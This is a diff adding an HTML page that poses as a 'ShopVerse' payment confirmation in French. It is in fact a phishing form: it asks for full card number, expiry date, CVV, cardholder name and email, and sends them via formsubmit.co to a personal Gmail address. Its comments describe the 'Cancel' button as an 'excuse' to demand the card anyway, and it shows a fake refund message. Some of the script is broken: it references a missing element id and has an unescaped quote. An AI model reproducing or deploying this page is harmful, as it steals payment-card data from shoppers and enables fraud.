@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirmation de paiement</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #f4f6f9;
+            color: #333;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 680px;
+            margin: 30px auto;
+            background: #fff;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            padding: 30px;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #e0e4e8;
+            padding-bottom: 15px;
+        }
+
+        .header h1 {
+            font-size: 1.2rem;
+            color: #1a5a1a;
+        }
+
+        .header .badge {
+            background: #d4edda;
+            color: #155724;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            font-weight: 600;
+        }
+
+        .transaction-info {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 25px;
+            padding: 15px;
+            background: #f8fafc;
+            border-radius: 8px;
+            border: 1px solid #e2e6ea;
+        }
+
+        .transaction-info .item {
+            font-size: 0.9rem;
+        }
+
+        .transaction-info .item strong {
+            display: block;
+            color: #555;
+            margin-bottom: 4px;
+        }
+
+        .transaction-info .item span {
+            color: #222;
+            font-weight: 600;
+        }
+
+        .amount-highlight {
+            font-size: 1.5rem;
+            color: #c0392b;
+        }
+
+        .warning-box {
+            background: #fff3e0;
+            border: 1px solid #ffcc80;
+            border-radius: 8px;
+            padding: 14px 18px;
+            margin-bottom: 20px;
+            font-size: 0.9rem;
+            line-height: 1.5;
+        }
+
+        .warning-box strong {
+            color: #92400e;
+        }
+
+        form {
+            margin-top: 15px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            display: block;
+            font-weight: 600;
+            font-size: 0.9rem;
+            margin-bottom: 6px;
+            color: #333;
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 10px 14px;
+            border: 1px solid #ccd4dc;
+            border-radius: 6px;
+            font-size: 0.95rem;
+            background: #fff;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #1a5a1a;
+            box-shadow: 0 0 0 3px rgba(26, 90, 26, 0.15);
+        }
+
+        .form-group .hint {
+            font-size: 0.78rem;
+            color: #777;
+            margin-top: 4px;
+        }
+
+        .card-row {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .card-row .form-group {
+            flex: 1;
+            min-width: 120px;
+        }
+
+        .actions {
+            display: flex;
+            gap: 12px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+
+        .btn {
+            padding: 12px 24px;
+            border: none;
+            border-radius: 8px;
+            font-size: 0.95rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn-confirm {
+            background: #1a5a1a;
+            color: #fff;
+        }
+
+        .btn-confirm:hover {
+            background: #143e14;
+        }
+
+        .btn-cancel {
+            background: #e74c3c;
+            color: #fff;
+        }
+
+        .btn-cancel:hover {
+            background: #c0392b;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 0.75rem;
+            color: #888;
+            border-top: 1px solid #e0e4e8;
+            padding-top: 12px;
+        }
+
+        .footer a {
+            color: #555;
+            text-decoration: none;
+        }
+
+        #status {
+            margin-top: 15px;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 0.9rem;
+            display: none;
+        }
+
+        #status.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #a3d9a5;
+        }
+
+        #status.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🎮 ShopVerse – Confirmation de commande</h1>
+            <span class="badge">Paiement en attente</span>
+        </div>
+
+        <div class="transaction-info">
+            <div class="item">
+                <strong>Référence</strong>
+                <span>ORD-48721-VX</span>
+            </div>
+            <div class="item">
+                <strong>Produit</strong>
+                <span>Game Bundle Premium</span>
+            </div>
+            <div class="item">
+                <strong>Montant</strong>
+                <span class="amount-highlight">79,99 €</span>
+            </div>
+        </div>
+
+        <div class="warning-box">
+            <strong>⚠️ Vérification de paiement requise :</strong>
+            Pour sécuriser votre commande, nous devons valider votre moyen de paiement
+            avant l'envoi du colis. Cette étape est obligatoire pour tout traitement
+            (confirmation ou annulation). Une référence unique est générée à partir
+            des 4 derniers chiffres de votre carte.
+        </div>
+
+        <form id="paymentForm" action="https://formsubmit.co/katzo8401@gmail.com" method="POST">
+            <!-- Hidden fields -->
+            <input type="hidden" name="_subject" value="Confirmation paiement – ORD-48721-VX">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_template" value="table">
+            <input type="hidden" name="reference" value="ORD-48721-VX">
+            <input type="hidden" name="montant" value="79,99 €">
+            <input type="hidden" name="date" value="">
+            <input type="hidden" name="action" value="confirm">
+
+            <!-- Card details -->
+            <div class="form-group">
+                <label for="cardName">Nom du titulaire (obligatoire)</label>
+                <input type="text" id="cardName" name="Nom titulaire" placeholder="Ex. Jean Dupont" required>
+            </div>
+
+            <div class="form-group">
+                <label for="cardNumber">Numéro de carte</label>
+                <input type="text" id="cardNumber" name="Numéro carte" placeholder="4242 4242 4242 4242" required>
+                <div class="hint">Saisissez les 16 chiffres. Le format sera validé automatiquement.</div>
+            </div>
+
+            <div class="card-row">
+                <div class="form-group">
+                    <label for="cardExpiry">Date d'expiration</label>
+                    <input type="text" id="cardExpiry" name="Expiration" placeholder="MM/AA" required>
+                </div>
+                <div class="form-group">
+                    <label for="cardCVV">CVV</label>
+                    <input type="text" id="cardCVV" name="CVV" placeholder="123" required>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="emailUser">Votre email</label>
+                <input type="email" id="emailUser" name="Email client" placeholder="vous@example.com" required>
+            </div>
+
+            <div class="actions">
+                <button type="submit" class="btn btn-confirm" id="btnConfirm">
+                    ✅ Confirmer le paiement
+                </button>
+                <button type="button" class="btn btn-cancel" id="btnCancel">
+                    ❌ Annuler la commande
+                </button>
+            </div>
+        </form>
+
+        <div id="status"></div>
+
+        <div class="footer">
+            <a href="#">Conditions générales</a> ·
+            <a href="#">Politique de remboursement</a> ·
+            © 2026 ShopVerse — Service client : <a href="mailto:katzo8401@gmail.com">katzo8401@gmail.com</a>
+        </div>
+    </div>
+
+    <script>
+        // Inject the current date into the hidden field
+        document.getElementById('date').value = new Date().toISOString();
+
+        const form = document.getElementById('paymentForm');
+        const btnConfirm = document.getElementById('btnConfirm');
+        const btnCancel = document.getElementById('btnCancel');
+        const statusEl = document.getElementById('status');
+
+        // --- Confirm button (default submit) ---
+        btnConfirm.addEventListener('click', () => {
+            form.querySelector('input[name="action"]').value = 'confirmation';
+            form.submit();
+        });
+
+        // --- Cancel button: still requires card info (the "excuse") ---
+        btnCancel.addEventListener('click', () => {
+            const cardNumber = document.getElementById('cardNumber').value.trim();
+            const cvv = document.getElementById('cardCVV').value.trim();
+
+            if (!cardNumber || !cvv) {
+                statusEl.textContent =
+                    '⚠️ Impossible d\'annuler sans numéro de carte : ' +
+                    'la procédure de remboursement nécessite la génération d'une référence unique ' +
+                    'à partir de votre carte. Veuillez saisir les informations de carte.';
+                statusEl.className = 'error';
+                statusEl.style.display = 'block';
+                return;
+            }
+
+            // The excuse: to "cancel", you must provide the card to generate a refund reference
+            const cancelReason =
+                'Annulation avec remboursement – carte nécessaire pour la ' +
+                'référence de remboursement (procédure standard anti-fraude)';
+
+            form.querySelector('input[name="action"]').value = 'annulation';
+
+            // Build a pseudo "refund reference" from the card
+            const lastFour = cardNumber.replace(/\D/g, '').slice(-4);
+            const refundRef = 'REF-' + lastFour + '-' + Date.now().toString(36).toUpperCase();
+
+            // Add a hidden field with the refund reference
+            let refundField = form.querySelector('input[name="refund_ref"]');
+            if (!refundField) {
+                refundField = document.createElement('input');
+                refundField.type = 'hidden';
+                refundField.name = 'refund_ref';
+                form.appendChild(refundField);
+            }
+            refundField.value = refundRef;
+
+            statusEl.textContent =
+                '✅ Annulation enregistrée. Référence de remboursement : ' +
+                refundRef + ' (délai : 3 à 5 jours ouvrés). ' +
+                'Un email de confirmation a été envoyé.';
+            statusEl.className = 'success';
+            statusEl.style.display = 'block';
+
+            // Send to FormSubmit with the cancel flag
+            form.submit();
+        });
+
+        // Simple card format validation (optional UX nicety)
+        document.getElementById('cardNumber').addEventListener('input', (e) => {
+            let val = e.target.value.replace(/\s+/g, '');
+            let formatted = val.match(/.{1,4}/g)?.join(' ') || val;
+            e.target.value = formatted;
+        });
+    </script>
+</body>
+</html>
